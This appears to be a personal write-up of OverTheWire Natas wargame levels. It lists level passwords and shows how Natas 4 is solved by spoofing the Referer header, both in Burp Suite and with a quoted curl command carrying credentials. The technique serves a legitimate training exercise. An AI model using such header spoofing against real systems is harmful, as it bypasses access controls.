> A collection of levels I found interesting while playing https://overthewire.org/wargames/natas/

# Passwords
1. 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq
2. TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI
3. 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
4. QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
5. 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
6. 0RoJwHdSKWFTYR5WuiAewauSuNaBXned


# Natas 4
> Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"

On intercepting the GET request on burpsuite after refreshing, this is what we get: 

```
GET /index.php HTTP/1.1
Host: natas4.natas.labs.overthewire.org
Authorization: Basic bmF0YXM0OlFyeVpYYzJlMHphaFVMZEhydEh4enlZa2o1OWtVeExR
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas4.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

I changed the referer to `natas5` and sent the new request to get the password for natas5. 

## Concepts Learned

This is a vulnerability called reference based access control. A different solution I saw for this challenge was to use the `curl` command (https://mayadevbe.me/posts/overthewire/natas/natas4/):

* `curl` is a tool used to send HTTP requests through the terminal
* The command used here is ``curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ -H "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org/index.php``


